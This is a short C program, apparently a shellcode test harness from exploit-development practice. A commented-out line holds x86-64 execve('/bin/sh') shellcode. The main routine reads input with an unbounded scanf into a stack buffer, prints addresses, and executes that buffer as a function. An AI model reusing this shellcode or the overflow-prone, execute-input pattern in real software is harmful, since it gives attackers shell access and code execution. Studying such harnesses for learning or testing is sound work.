#include <stdio.h>
//char shellcode[] = "hri\x01\x01\x81\x34$\x01\x01\x01\x01\x31\xd2Rj\x08ZH\x01\xe2RH\x89\xe2jhH\xb8/bin///sPj;XH\x89\xe7H\x89\xd6\x99\x0f\x05";

int main(){
	char shellcode[200];
	scanf("%s", shellcode);
	/*void (*fp)(void);
	fp = (void *)shellcode;
	fp();*/
	int (*func)();
	printf("shellcode: %llx\nfunction pointer: %llx\n", shellcode, &func);
	func = (int(*)())shellcode;
	(int)(*func)();
}
